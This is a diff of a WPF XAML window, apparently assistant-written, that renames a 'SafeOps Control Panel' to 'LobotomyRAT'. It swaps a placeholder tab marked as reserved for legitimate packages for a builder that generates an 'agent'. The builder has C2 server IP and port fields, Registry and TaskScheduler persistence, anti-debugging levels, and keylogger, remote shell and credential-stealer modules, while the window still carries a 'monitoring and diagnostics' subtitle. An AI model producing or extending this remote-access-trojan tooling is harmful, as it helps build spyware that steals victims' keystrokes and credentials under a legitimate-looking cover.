@@ -1,8 +1,8 @@
-<!-- MainWindow.xaml — исправленная версия без конфликтов приведения типов -->
+<!-- MainWindow.xaml — полная версия с вкладкой Билдер (замените ваш текущий XAML) -->
 <Window x:Class="SafeOps.Panel.MainWindow"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-        Title="SafeOps Control Panel"
+        Title="LobotomyRAT"
         Width="1120"
         Height="720"
         MinWidth="920"
@@ -11,7 +11,6 @@
         WindowStartupLocation="CenterScreen"
         Loaded="Window_Loaded">
     <Window.Resources>
-        <!-- Кисти и стили (без изменений) -->
         <SolidColorBrush x:Key="PanelBackground" Color="#111827"/>
         <SolidColorBrush x:Key="PanelBorder" Color="#263244"/>
         <SolidColorBrush x:Key="FieldBackground" Color="#0B1220"/>
@@ -24,13 +23,13 @@
         <SolidColorBrush x:Key="{x:Static SystemColors.HighlightTextBrushKey}" Color="#F8FAFC"/>
         <SolidColorBrush x:Key="{x:Static SystemColors.InactiveSelectionHighlightBrushKey}" Color="#1E293B"/>
 
-        <!-- Контекстное меню как ресурс -->
         <ContextMenu x:Key="RowContextMenu">
             <MenuItem Header="PING" Click="ContextMenuPing_Click"/>
             <MenuItem Header="SCREENSHOT" Click="ContextMenuScreenshot_Click"/>
             <MenuItem Header="INFO" Click="ContextMenuInfo_Click"/>
         </ContextMenu>
 
+        <!-- Стили (как в вашем файле, они уже есть) -->
         <Style TargetType="TextBlock">
             <Setter Property="Foreground" Value="{StaticResource TextPrimary}"/>
         </Style>
@@ -152,7 +151,6 @@
             <Setter Property="Foreground" Value="{StaticResource TextPrimary}"/>
         </Style>
 
-        <!-- Стиль строк DataGrid с контекстным меню и выделением -->
         <Style TargetType="DataGridRow">
             <EventSetter Event="MouseRightButtonDown" Handler="DataGridRow_MouseRightButtonDown"/>
             <Setter Property="ContextMenu" Value="{StaticResource RowContextMenu}"/>
@@ -165,7 +163,6 @@
         </Style>
     </Window.Resources>
 
-    <!-- Основная разметка окна (без изменений) -->
     <Grid>
         <Grid.RowDefinitions>
             <RowDefinition Height="Auto"/>
@@ -180,7 +177,7 @@
                     <ColumnDefinition Width="Auto"/>
                 </Grid.ColumnDefinitions>
                 <StackPanel>
-                    <TextBlock Text="SafeOps Control Panel" FontSize="24" FontWeight="SemiBold"/>
+                    <TextBlock Text="LobotomyRAT" FontSize="24" FontWeight="SemiBold"/>
                     <TextBlock Text="Система мониторинга и диагностики" Style="{StaticResource MutedText}" Margin="0,5,0,0"/>
                 </StackPanel>
                 <StackPanel Grid.Column="1" Orientation="Horizontal" VerticalAlignment="Center">
@@ -305,13 +302,36 @@
             <!-- Вкладка Билдер -->
             <TabItem Header="Билдер">
                 <Grid Margin="0,18,0,0">
-                    <Border Background="{StaticResource PanelBackground}" BorderBrush="{StaticResource PanelBorder}" BorderThickness="1" CornerRadius="8" Padding="24">
-                        <StackPanel HorizontalAlignment="Center" VerticalAlignment="Center">
-                            <TextBlock Text="Билдер" FontSize="24" FontWeight="SemiBold" HorizontalAlignment="Center"/>
-                            <TextBlock Text="Раздел зарезервирован под будущие легитимные пакеты конфигурации"
-                                       Style="{StaticResource MutedText}"
-                                       Margin="0,8,0,0"
-                                       HorizontalAlignment="Center"/>
+                    <Border Background="{StaticResource PanelBackground}" BorderBrush="{StaticResource PanelBorder}" BorderThickness="1" CornerRadius="8" Padding="22" MaxWidth="640" HorizontalAlignment="Left" Width="642">
+                        <StackPanel>
+                            <TextBlock Text="Генерация агента" FontSize="18" FontWeight="SemiBold" Margin="0,0,0,18" Width="1023"/>
+                            <TextBlock Text="IP сервера" Foreground="{StaticResource TextMuted}" Margin="0,0,0,6"/>
+                            <TextBox x:Name="BuilderIpTextBox" Text="127.0.0.1" Margin="0,0,0,16"/>
+                            <TextBlock Text="Порт сервера" Foreground="{StaticResource TextMuted}" Margin="0,0,0,6"/>
+                            <TextBox x:Name="BuilderPortTextBox" Text="12345" Margin="0,0,0,16"/>
+                            <TextBlock Text="Метод постоянства" Foreground="{StaticResource TextMuted}" Margin="0,0,0,6"/>
+                            <ComboBox x:Name="BuilderPersistenceComboBox" Margin="0,0,0,16">
+                                <ComboBoxItem Content="None" IsSelected="True"/>
+                                <ComboBoxItem Content="Registry"/>
+                                <ComboBoxItem Content="TaskScheduler"/>
+                                <ComboBoxItem Content="Both"/>
+                            </ComboBox>
+                            <TextBlock Text="Уровень антиотладки" Foreground="{StaticResource TextMuted}" Margin="0,0,0,6"/>
+                            <ComboBox x:Name="BuilderAntiDebugComboBox" Margin="0,0,0,16">
+                                <ComboBoxItem Content="1 (базовый)"/>
+                                <ComboBoxItem Content="2 (средний)" IsSelected="True"/>
+                                <ComboBoxItem Content="3 (максимальный)"/>
+                            </ComboBox>
+                            <TextBlock Text="Автоудаление (дни)" Foreground="{StaticResource TextMuted}" Margin="0,0,0,6"/>
+                            <TextBox x:Name="BuilderAutoDeleteTextBox" Text="60" Margin="0,0,0,16"/>
+                            <TextBlock Text="Включить модули" Foreground="{StaticResource TextMuted}" Margin="0,0,0,6"/>
+                            <CheckBox x:Name="BuilderModuleScreenshot" Content="screenshot" Margin="0,2"/>
+                            <CheckBox x:Name="BuilderModuleKeylogger" Content="keylogger" Margin="0,2"/>
+                            <CheckBox x:Name="BuilderModuleShell" Content="shell" Margin="0,2"/>
+                            <CheckBox x:Name="BuilderModuleFilemgr" Content="filemgr" Margin="0,2"/>
+                            <CheckBox x:Name="BuilderModuleStealer" Content="stealer" Margin="0,2"/>
+                            <Button x:Name="BuilderGenerateButton" Content="Собрать агента" Style="{StaticResource PrimaryButton}" Width="160" Height="40" Click="BuilderGenerateButton_Click" Margin="0,20,0,0"/>
+                            <TextBlock x:Name="BuilderResultTextBlock" Foreground="{StaticResource TextMuted}" Margin="0,10,0,0" TextWrapping="Wrap"/>
                         </StackPanel>
                     </Border>
                 </Grid>
